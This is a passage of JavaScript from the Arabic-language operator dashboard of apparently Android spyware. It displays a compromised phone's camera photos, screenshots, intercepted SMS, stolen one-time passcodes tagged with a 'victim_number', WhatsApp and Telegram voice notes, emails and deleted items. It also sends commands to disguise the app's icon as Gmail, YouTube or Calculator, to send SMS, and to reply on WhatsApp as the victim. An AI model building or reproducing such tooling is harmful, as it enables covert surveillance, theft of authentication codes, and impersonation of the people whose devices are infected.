    const grid = document.getElementById('liveScreenshotsGrid');
    if (!grid) return;
    if (liveScreenshots.length === 0) { grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">لا توجد لقطات</p>'; return; }
    grid.innerHTML = '';
    liveScreenshots.forEach((ss, idx) => {
        const card = document.createElement('div');
        card.style.cssText = 'background:#111;padding:10px;border-radius:8px;border:1px solid #ffcc00;';
        card.innerHTML = `
            <img src="data:image/jpeg;base64,${ss.file_data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
            <div style="color:#ffcc00;font-size:11px;margin-top:8px;word-break:break-all;">${ss.file_name || ''}</div>
            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(ss.timestamp)}</div>
            <div style="display:flex;gap:5px;margin-top:8px;">
                <button onclick="downloadLiveScreenshot(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">⬇️</button>
                <button onclick="deleteLiveScreenshot(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️</button>
            </div>`;
        grid.appendChild(card);
    });
}
function downloadLiveScreenshot(idx) {
    const s = liveScreenshots[idx]; if (!s) return;
    const a = document.createElement('a');
    a.href = `data:image/jpeg;base64,${s.file_data}`;
    a.download = s.file_name || 'screenshot.jpg';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteLiveScreenshot(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/api.php?action=delete_screenshot&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        liveScreenshots.splice(idx, 1); renderLiveScreenshots();
    });
}

// ═══════════════════════════════════════════
// Camera photos
// ═══════════════════════════════════════════
function openLiveCamera() { document.getElementById('liveCameraOverlay').style.display = 'block'; loadCameraPhotos(); }
function closeLiveCamera() { document.getElementById('liveCameraOverlay').style.display = 'none'; }
function clearLiveCamera() {
    if (!confirm('مسح؟')) return;
    authFetch(`/api.php?action=clear_camera_photos&device=${encodeURIComponent(currentDevice)}`).then(() => { liveCameraPhotos = []; renderLiveCamera(); });
}
function addLiveCameraPhoto(data) {
    liveCameraPhotos.unshift(data);
    if (liveCameraPhotos.length > 200) liveCameraPhotos = liveCameraPhotos.slice(0, 200);
    if (document.getElementById('liveCameraOverlay')?.style.display === 'block') renderLiveCamera();
    updateAdvancedCounters();
}
async function loadCameraPhotos() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_camera_photos&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveCameraPhotos = data; renderLiveCamera(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveCamera() {
    const grid = document.getElementById('liveCameraGrid');
    if (!grid) return;
    if (liveCameraPhotos.length === 0) { grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">لا توجد صور</p>'; return; }
    grid.innerHTML = '';
    liveCameraPhotos.forEach((photo, idx) => {
        const camLabel = photo.camera_name === 'front' ? '🤳 أمامية' : '📷 خلفية';
        const camColor = photo.camera_name === 'front' ? '#9b59b6' : '#6a2c8a';
        const card = document.createElement('div');
        card.style.cssText = `background:#111;padding:10px;border-radius:8px;border:1px solid ${camColor};`;
        card.innerHTML = `
            <img src="data:image/jpeg;base64,${photo.file_data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
            <div style="color:${camColor};font-size:11px;margin-top:8px;font-weight:bold;">${camLabel}</div>
            <div style="color:#ccc;font-size:10px;margin-top:3px;word-break:break-all;">${photo.file_name || ''}</div>
            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(photo.timestamp)}</div>
            <div style="display:flex;gap:5px;margin-top:8px;">
                <button onclick="downloadLiveCameraPhoto(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">⬇️</button>
                <button onclick="deleteLiveCameraPhoto(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️</button>
            </div>`;
        grid.appendChild(card);
    });
}
function downloadLiveCameraPhoto(idx) {
    const p = liveCameraPhotos[idx]; if (!p) return;
    const a = document.createElement('a');
    a.href = `data:image/jpeg;base64,${p.file_data}`;
    a.download = p.file_name || 'camera.jpg';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteLiveCameraPhoto(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/api.php?action=delete_camera_photo&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        liveCameraPhotos.splice(idx, 1); renderLiveCamera();
    });
}

// ═══════════════════════════════════════════
// Live images
// ═══════════════════════════════════════════
function openLiveImages() { document.getElementById('liveImagesOverlay').style.display = 'block'; renderLiveImages(); }
function closeLiveImages() { document.getElementById('liveImagesOverlay').style.display = 'none'; }
function clearLiveImages() { if (!confirm('مسح؟')) return; liveImages = []; const el = document.getElementById('liveImagesCount'); if (el) el.textContent = '0'; renderLiveImages(); }
function addLiveImage(img) {
    liveImages.unshift(img);
    if (liveImages.length > 200) liveImages = liveImages.slice(0, 200);
    const el = document.getElementById('liveImagesCount');
    if (el) el.textContent = liveImages.length;
    const btn = document.getElementById('liveImagesBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveImagesOverlay')?.style.display === 'block') renderLiveImages();
}
function renderLiveImages() {
    const grid = document.getElementById('liveImagesGrid');
    if (!grid) return;
    if (liveImages.length === 0) { grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة...</p>'; return; }
    grid.innerHTML = '';
    liveImages.forEach((img, idx) => {
        const card = document.createElement('div');
        card.style.cssText = 'background:#111;padding:10px;border-radius:8px;border:1px solid #00ffcc;';
        let m = 'image/jpeg';
        if (img.name) { const e = img.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; else if (e === 'webp') m = 'image/webp'; }
        const sourceLabels = { camera: '📸 كاميرا', screenshot: '📱 سكرين', screen_record: '🎥 تسجيل', whatsapp: '💬 واتساب', telegram: '✈️ تيليجرام', download: '⬇️', unknown: '📁' };
        card.innerHTML = `
            <img src="data:${m};base64,${img.data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
            <div style="color:#00ffcc;font-size:12px;margin-top:8px;font-weight:bold;">${sourceLabels[img.source] || '📁'}</div>
            <div style="color:#ccc;font-size:11px;margin-top:3px;word-break:break-all;">${img.name || 'صورة'}</div>
            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(img.date)}</div>
            <div style="display:flex;gap:5px;margin-top:8px;">
                <button onclick="downloadLiveImage(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️</button>
                <button onclick="deleteLiveImage(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️</button>
            </div>`;
        grid.appendChild(card);
    });
}
function downloadLiveImage(idx) {
    const img = liveImages[idx]; if (!img) return;
    let m = 'image/jpeg';
    if (img.name) { const e = img.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; else if (e === 'webp') m = 'image/webp'; }
    const a = document.createElement('a');
    a.href = `data:${m};base64,${img.data}`;
    a.download = img.name || 'image.jpg';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteLiveImage(idx) { if (!confirm('حذف؟')) return; liveImages.splice(idx, 1); const el = document.getElementById('liveImagesCount'); if (el) el.textContent = liveImages.length; renderLiveImages(); }

// ═══════════════════════════════════════════
// Live msgs
// ═══════════════════════════════════════════
function openLiveMessages() { document.getElementById('liveMsgsOverlay').style.display = 'block'; renderLiveMsgs(); }
function closeLiveMessages() { document.getElementById('liveMsgsOverlay').style.display = 'none'; }
function clearLiveMsgs() { if (!confirm('مسح؟')) return; liveMsgs = []; const el = document.getElementById('liveMsgsCount'); if (el) el.textContent = '0'; renderLiveMsgs(); }
function filterLiveMsgs(type) {
    liveMsgsFilter = type;
    const setBg = (id, active) => { const el = document.getElementById(id); if (el) el.style.background = active ? '#ff0066' : '#333'; };
    setBg('filterAll', type === 'all'); setBg('filterIn', type === 'in'); setBg('filterOut', type === 'out');
    renderLiveMsgs();
}
function addLiveMsg(msg) {
    liveMsgs.unshift(msg);
    if (liveMsgs.length > 500) liveMsgs = liveMsgs.slice(0, 500);
    const el = document.getElementById('liveMsgsCount');
    if (el) el.textContent = liveMsgs.length;
    const btn = document.getElementById('liveMsgsBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveMsgsOverlay')?.style.display === 'block') renderLiveMsgs();
}
function renderLiveMsgs() {
    const list = document.getElementById('liveMsgsList');
    if (!list) return;
    let filtered = liveMsgs;
    if (liveMsgsFilter === 'in') filtered = liveMsgs.filter(m => m.type == 1);
    if (liveMsgsFilter === 'out') filtered = liveMsgs.filter(m => m.type == 2);
    if (filtered.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>'; return; }
    list.innerHTML = '';
    filtered.forEach((msg) => {
        const realIdx = liveMsgs.indexOf(msg);
        const isIncoming = msg.type == 1;
        const displayName = findContactName(msg.address) || msg.address || 'غير معروف';
        const div = document.createElement('div');
        div.style.cssText = `display:flex;${isIncoming ? 'justify-content:flex-start;' : 'justify-content:flex-end;'}`;
        div.innerHTML = `
            <div style="max-width:70%;background:${isIncoming ? '#1e2a2a' : '#2a1a20'};border:1px solid ${isIncoming ? '#25D366' : '#ff0066'};padding:12px 15px;border-radius:15px;">
                <div style="color:${isIncoming ? '#25D366' : '#ff0066'};font-size:11px;font-weight:bold;margin-bottom:5px;">${isIncoming ? '📥' : '📤'} — ${displayName}</div>
                <div style="color:#fff;font-size:14px;line-height:1.5;">${msg.body || ''}</div>
                <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;gap:10px;">
                    <span style="color:#888;font-size:11px;">${formatDate(msg.date)}</span>
                    <button onclick="deleteLiveMsg(${realIdx})" style="background:none;border:none;color:#ff3300;cursor:pointer;font-size:14px;">🗑️</button>
                </div>
            </div>`;
        list.appendChild(div);
    });
}
function deleteLiveMsg(idx) { if (!confirm('حذف؟')) return; liveMsgs.splice(idx, 1); const el = document.getElementById('liveMsgsCount'); if (el) el.textContent = liveMsgs.length; renderLiveMsgs(); }

// ═══════════════════════════════════════════
// Live OTP
// ═══════════════════════════════════════════
function openLiveOtp() { document.getElementById('liveOtpOverlay').style.display = 'block'; renderLiveOtp(); }
function closeLiveOtp() { document.getElementById('liveOtpOverlay').style.display = 'none'; }
function clearLiveOtp() { if (!confirm('مسح؟')) return; liveOtps = []; const el = document.getElementById('liveOtpCount'); if (el) el.textContent = '0'; renderLiveOtp(); }
function addLiveOtp(otp) {
    liveOtps.unshift(otp);
    if (liveOtps.length > 200) liveOtps = liveOtps.slice(0, 200);
    const el = document.getElementById('liveOtpCount');
    if (el) el.textContent = liveOtps.length;
    if (document.getElementById('liveOtpOverlay')?.style.display === 'block') renderLiveOtp();
}
function renderLiveOtp() {
    const list = document.getElementById('liveOtpList');
    if (!list) return;
    if (liveOtps.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد</p>'; return; }
    list.innerHTML = '';
    liveOtps.forEach((otp, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#1a1a00;border:2px solid #ffcc00;padding:20px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#ffcc00;font-size:12px;font-weight:bold;margin-bottom:8px;">${otp.app_name || 'OTP'} — ${formatDate(otp.timestamp)}</div>
            <div style="color:#fff;font-size:32px;font-weight:bold;letter-spacing:5px;margin:10px 0;">${otp.code || '—'}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:5px;">📱 ${otp.victim_number || 'غير معروف'}</div>
            <div style="color:#aaa;font-size:12px;margin-bottom:5px;">المرسل: ${otp.sender || '—'}</div>
            <div style="color:#888;font-size:11px;word-break:break-all;">${otp.message || ''}</div>
            <button onclick="deleteLiveOtp(${idx})" style="margin-top:10px;background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>`;
        list.appendChild(div);
    });
}
function deleteLiveOtp(idx) { if (!confirm('حذف؟')) return; liveOtps.splice(idx, 1); const el = document.getElementById('liveOtpCount'); if (el) el.textContent = liveOtps.length; renderLiveOtp(); }

// ═══════════════════════════════════════════
// Live voices
// ═══════════════════════════════════════════
function openLiveVoices() { document.getElementById('liveVoicesOverlay').style.display = 'block'; renderLiveVoices(); }
function closeLiveVoices() { document.getElementById('liveVoicesOverlay').style.display = 'none'; }
function clearLiveVoices() { if (!confirm('مسح؟')) return; liveVoices = []; const el = document.getElementById('liveVoicesCount'); if (el) el.textContent = '0'; renderLiveVoices(); }
function addLiveVoice(voice) {
    liveVoices.unshift(voice);
    if (liveVoices.length > 200) liveVoices = liveVoices.slice(0, 200);
    const el = document.getElementById('liveVoicesCount');
    if (el) el.textContent = liveVoices.length;
    if (document.getElementById('liveVoicesOverlay')?.style.display === 'block') renderLiveVoices();
}
function renderLiveVoices() {
    const list = document.getElementById('liveVoicesList');
    if (!list) return;
    if (liveVoices.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد صوتيات</p>'; return; }
    list.innerHTML = '';
    liveVoices.forEach((voice, idx) => {
        const sourceLabels = { whatsapp_voice: '💬 واتساب', telegram_voice: '✈️ تيليجرام', unknown: '🎤' };
        const dirLabel = voice.direction === 'sent' ? '📤' : voice.direction === 'received' ? '📥' : '🎤';
        const div = document.createElement('div');
        div.style.cssText = 'background:#0a1a1a;border:2px solid #00ffcc;padding:15px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#00ffcc;font-size:13px;font-weight:bold;margin-bottom:8px;">${dirLabel} — ${sourceLabels[voice.source] || '🎤'}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:8px;">📅 ${formatDate(voice.timestamp)}</div>
            <div style="color:#888;font-size:11px;margin-bottom:8px;">${voice.file_name || ''} (${((voice.file_size||0) / 1024).toFixed(1)} KB)</div>
            <audio controls style="width:100%;margin-bottom:8px;" preload="none">
                <source src="data:audio/ogg;base64,${voice.file_data}" type="audio/ogg">
                <source src="data:audio/mp4;base64,${voice.file_data}" type="audio/mp4">
            </audio>
            <div style="display:flex;gap:8px;">
                <button onclick="downloadLiveVoice(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️</button>
                <button onclick="deleteLiveVoice(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️</button>
            </div>`;
        list.appendChild(div);
    });
}
function downloadLiveVoice(idx) {
    const v = liveVoices[idx]; if (!v) return;
    let mime = 'audio/ogg';
    if (v.file_name) {
        const n = v.file_name.toLowerCase();
        if (n.endsWith('.opus') || n.endsWith('.ogg')) mime = 'audio/ogg';
        else if (n.endsWith('.m4a')) mime = 'audio/mp4';
        else if (n.endsWith('.mp3')) mime = 'audio/mpeg';
    }
    const a = document.createElement('a');
    a.href = `data:${mime};base64,${v.file_data}`;
    a.download = v.file_name || 'voice.opus';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteLiveVoice(idx) { if (!confirm('حذف؟')) return; liveVoices.splice(idx, 1); const el = document.getElementById('liveVoicesCount'); if (el) el.textContent = liveVoices.length; renderLiveVoices(); }

// ═══════════════════════════════════════════
// Live emails
// ═══════════════════════════════════════════
function openLiveEmails() { document.getElementById('liveEmailsOverlay').style.display = 'block'; renderLiveEmails(); }
function closeLiveEmails() { document.getElementById('liveEmailsOverlay').style.display = 'none'; }
function clearLiveEmails() { if (!confirm('مسح؟')) return; liveEmails = []; const el = document.getElementById('liveEmailsCount'); if (el) el.textContent = '0'; renderLiveEmails(); }
function addLiveEmail(email) {
    liveEmails.unshift(email);
    if (liveEmails.length > 200) liveEmails = liveEmails.slice(0, 200);
    const el = document.getElementById('liveEmailsCount');
    if (el) el.textContent = liveEmails.length;
    if (document.getElementById('liveEmailsOverlay')?.style.display === 'block') renderLiveEmails();
}
function renderLiveEmails() {
    const list = document.getElementById('liveEmailsList');
    if (!list) return;
    if (liveEmails.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>'; return; }
    list.innerHTML = '';
    liveEmails.forEach((email, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#1a1a2e;border:2px solid #00aaff;padding:15px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#00aaff;font-size:13px;font-weight:bold;margin-bottom:8px;">📧 ${email.app_name || 'Email'}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:5px;">👤 <b>${email.sender || 'غير معروف'}</b></div>
            <div style="color:#fff;font-size:14px;margin-bottom:5px;font-weight:bold;">${email.subject || ''}</div>
            <div style="color:#888;font-size:12px;margin-bottom:8px;">${email.snippet || ''}</div>
            <div style="color:#aaa;font-size:11px;margin-bottom:8px;">📅 ${formatDate(email.timestamp)}</div>
            ${email.image_data ? `<img src="data:image/jpeg;base64,${email.image_data}" style="max-width:200px;border-radius:5px;margin-bottom:8px;cursor:pointer;" onclick="window.open(this.src)">` : ''}
            <button onclick="deleteLiveEmail(${idx})" style="background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>`;
        list.appendChild(div);
    });
}
function deleteLiveEmail(idx) { if (!confirm('حذف؟')) return; liveEmails.splice(idx, 1); const el = document.getElementById('liveEmailsCount'); if (el) el.textContent = liveEmails.length; renderLiveEmails(); }

// ═══════════════════════════════════════════
// Disguise
// ═══════════════════════════════════════════
async function changeDisguise(appName) {
    if (!currentDevice) { alert('⚠️'); return; }
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'disguise', app: appName, token: getAuthToken() })
        });
        const result = await response.json();
        if (result.success) {
            showNotification('🎭 تم', `سيتم التغيير إلى "${appName}"`, '🎭');
            document.getElementById('disguiseOverlay')?.remove();
        } else alert('❌');
    } catch (e) { alert('❌ ' + e.message); }
}

function openDisguiseMenu() {
    if (!currentDevice) { alert('⚠️'); return; }
    if (document.getElementById('disguiseOverlay')) return;
    const options = [
        { id: 'Default', label: '📱 رسائل (افتراضي)', bg: '#333' },
        { id: 'Youtube', label: '▶️ YouTube', bg: '#ff0000' },
        { id: 'Twitter', label: '🐦 Twitter / X', bg: '#000' },
        { id: 'Facebook', label: '👥 Facebook', bg: '#1877f2' },
        { id: 'Settings', label: '⚙️ Settings', bg: '#555' },
        { id: 'Gallery', label: '🖼️ Gallery', bg: '#4285f4' },
        { id: 'Chrome', label: '🌐 Chrome', bg: '#4285f4' },
        { id: 'Gmail', label: '📧 Gmail', bg: '#ea4335' },
        { id: 'Calculator', label: '🧮 Calculator', bg: '#2c3e50' }
    ];
    const ov = document.createElement('div');
    ov.id = 'disguiseOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;overflow-y:auto;padding:20px;';
    ov.innerHTML = `
        <div style="max-width:450px;margin:0 auto;background:#111;border:2px solid #00ffcc;border-radius:15px;padding:25px;">
            <h2 style="color:#00ffcc;text-align:center;margin-bottom:10px;">🎭 تغيير الأيقونة</h2>
            <p style="color:#888;font-size:12px;text-align:center;margin-bottom:20px;">⚠️ بعد التغيير — قد تحتاج خروج ودخول</p>
            <div style="display:flex;flex-direction:column;gap:10px;">
                ${options.map(o => `<button onclick="changeDisguise('${o.id}')" style="background:${o.bg};color:#fff;border:1px solid #444;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;text-align:right;">${o.label}</button>`).join('')}
            </div>
            <button onclick="document.getElementById('disguiseOverlay').remove()" style="width:100%;margin-top:15px;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;">✖ إغلاق</button>
        </div>`;
    document.body.appendChild(ov);
}

// ═══════════════════════════════════════════
// Send SMS
// ═══════════════════════════════════════════
async function sendSmsCommand(number, message) {
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'send_sms_direct', number, message, token: getAuthToken() })
        });
        return (await response.json()).success;
    } catch (e) { return false; }
}

function openSendSms() {
    if (document.getElementById('smsSendOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'smsSendOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #00ffcc;border-radius:15px;padding:30px;max-width:450px;width:100%;">
            <h2 style="color:#00ffcc;margin-bottom:20px;text-align:center;">📨 إرسال SMS</h2>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">رقم المستلم</label>
                <input id="smsNumber" type="tel" placeholder="+967712345678" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;font-size:15px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">النص</label>
                <textarea id="smsMessage" rows="4" placeholder="اكتب الرسالة..." style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;font-size:15px;resize:vertical;"></textarea>
            </div>
            <div style="display:flex;gap:10px;">
                <button onclick="doSendSms()" style="flex:1;background:#00ffcc;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;">📤 إرسال</button>
                <button onclick="document.getElementById('smsSendOverlay').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
            </div>
        </div>`;
    document.body.appendChild(ov);
}

async function doSendSms() {
    const n = document.getElementById('smsNumber').value.trim();
    const m = document.getElementById('smsMessage').value.trim();
    if (!n || !m) { alert('⚠️'); return; }
    const ok = await sendSmsCommand(n, m);
    if (ok) { alert('✅ تم'); document.getElementById('smsSendOverlay')?.remove(); }
    else alert('❌');
}

function openSendSmsTo(number) {
    openSendSms();
    setTimeout(() => { const el = document.getElementById('smsNumber'); if (el) el.value = number; }, 100);
}

// ═══════════════════════════════════════════
// Reply WhatsApp
// ═══════════════════════════════════════════
async function replyWhatsAppCmd(sender, message) {
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'reply_whatsapp', sender, message, token: getAuthToken() })
        });
        return (await response.json()).success;
    } catch (e) { return false; }
}

function openReplyWhatsApp(sender) {
    if (document.getElementById('waReplyOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'waReplyOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #25D366;border-radius:15px;padding:30px;max-width:450px;width:100%;">
            <h2 style="color:#25D366;margin-bottom:8px;text-align:center;">💬 رد واتساب</h2>
            <p style="color:#888;text-align:center;margin-bottom:20px;font-size:13px;">إلى: ${sender}</p>
            <textarea id="waReplyMsg" rows="4" placeholder="اكتب الرد..." style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #25D366;border-radius:8px;font-size:15px;margin-bottom:15px;resize:vertical;"></textarea>
            <div style="display:flex;gap:10px;">
                <button onclick="doReplyWa('${sender.replace(/'/g, "\\'")}')" style="flex:1;background:#25D366;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">📤 إرسال</button>
                <button onclick="document.getElementById('waReplyOverlay').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
            </div>
        </div>`;
    document.body.appendChild(ov);
}

async function doReplyWa(sender) {
    const m = document.getElementById('waReplyMsg').value.trim();
    if (!m) { alert('⚠️'); return; }
    const ok = await replyWhatsAppCmd(sender, m);
    if (ok) { alert('✅'); document.getElementById('waReplyOverlay')?.remove(); }
    else alert('❌');
}

function openReplyWaPicker() {
    if (!currentDevice) { alert('⚠️'); return; }
    authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=100`)
        .then(res => res.json())
        .then(messages => {
            const senders = [...new Set(messages.map(m => m.sender))].filter(s => s);
            if (senders.length === 0) { alert('⚠️'); return; }
            const ov = document.createElement('div');
            ov.id = 'waPickerOverlay';
            ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;overflow-y:auto;padding:20px;';
            ov.innerHTML = `
                <div style="max-width:450px;margin:0 auto;background:#111;border:2px solid #25D366;border-radius:15px;padding:20px;">
                    <h2 style="color:#25D366;text-align:center;margin-bottom:20px;">💬 اختر المرسل</h2>
                    <div style="max-height:400px;overflow-y:auto;">
                        ${senders.map(s => `<div onclick="openReplyWhatsApp('${s.replace(/'/g, "\\'")}'); document.getElementById('waPickerOverlay').remove();" style="padding:15px;background:#1e2a2a;border:1px solid #25D366;border-radius:8px;margin-bottom:8px;cursor:pointer;color:#fff;font-size:15px;">📥 ${s}</div>`).join('')}
                    </div>
                    <button onclick="document.getElementById('waPickerOverlay').remove()" style="width:100%;margin-top:15px;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">✖</button>
                </div>`;
            document.body.appendChild(ov);
        }).catch(() => alert('❌'));
}

// ═══════════════════════════════════════════
// Deleted
// ═══════════════════════════════════════════
function filterDeleted(type) {
    deletedFilter = type;
    const btns = { all: 'delFilterAll', call_log: 'delFilterCall', sms: 'delFilterSms', image: 'delFilterImg' };
    Object.keys(btns).forEach(k => {
        const el = document.getElementById(btns[k]);
        if (el) {
            el.style.background = (k === type) ? '#00ffcc' : '#333';
            el.style.color = (k === type) ? '#000' : '#fff';
        }
    });
    displayDeleted();
}

async function clearAllDeleted() {
    if (!currentDevice) return;
    if (!confirm('مسح الكل؟')) return;
    try {
        const response = await authFetch(`/api.php?action=clear_deleted&device=${encodeURIComponent(currentDevice)}`);
        const result = await response.json();
        if (result.success) {
            allDeleted = []; lastDeletedCount = 0; displayDeleted();
            const badge = document.getElementById('deletedCount');
            if (badge) { badge.textContent = '(0)'; badge.className = 'count'; }
            showNotification('✅', 'تم المسح', '🗑️');
        }
    } catch (e) {}
}

async function deleteSingleDeleted(index) {
    if (!confirm('حذف؟')) return;
    try {
        const response = await authFetch(`/api.php?action=delete_deleted_item&device=${encodeURIComponent(currentDevice)}&index=${index}`);
        const result = await response.json();
        if (result.success) {
            allDeleted.splice(index, 1); displayDeleted();
            const badge = document.getElementById('deletedCount');
            if (badge) badge.textContent = `(${allDeleted.length})`;
        }
    } catch (e) {}
}

function checkNewSMS(newSMS) {
    if (!newSMS || newSMS.length === 0) return;
    if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
        const s = newSMS[0];
        showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
        const badge = document.getElementById('smsCount');
        if (badge) { badge.textContent = `(${newSMS.length}) 🔴`; badge.className = 'count badge-new'; }
    }
    lastSmsCount = newSMS.length;
}

function checkNewCalls(newCalls) {
    if (!newCalls || newCalls.length === 0) return;
    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
        const c = newCalls[0];
        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
        const badge = document.getElementById('callCount');
        if (badge) { badge.textContent = `(${newCalls.length}) 🔴`; badge.className = 'count badge-new'; }
    }
    lastCallCount = newCalls.length;
}

function checkNewDeleted(deleted) {
    if (!deleted || deleted.length === 0) return;
    if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
        const d = deleted[0];
        const t = d.type || d.deleted_type || '';
        const typeName = t === 'call_log' ? '📞 مكالمة محذوفة' : t === 'sms' ? '💬 رسالة محذوفة' : t === 'contact' ? '👤 جهة محذوفة' : t === 'image' ? '🖼️ صورة محذوفة' : '🗑️ عنصر محذوف';
        showNotification(typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
        const badge = document.getElementById('deletedCount');
        if (badge) { badge.textContent = `(${deleted.length}) 🔴`; badge.className = 'count badge-new'; }
    }
    lastDeletedCount = deleted.length;
}

async function deleteDevice() {
    if (!currentDevice) return;
    if (!confirm('حذف الجهاز؟')) return;
    try {
        const response = await authFetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
        const result = await response.json();
        if (result.success) {
            alert('✅');
            currentDevice = null;
            document.getElementById('deviceSelect').value = '';
            document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز';
            document.getElementById('deviceNameDisplay').className = 'device-name-display';
            setTimeout(() => loadDevices(), 500);
        }
    } catch (e) {}
}

// ═══════════════════════════════════════════
// Load devices / select
// ═══════════════════════════════════════════
async function loadDevices() {
    try {
        const response = await authFetch('/devices.json');
        const devices = await response.json();
        const select = document.getElementById('deviceSelect');
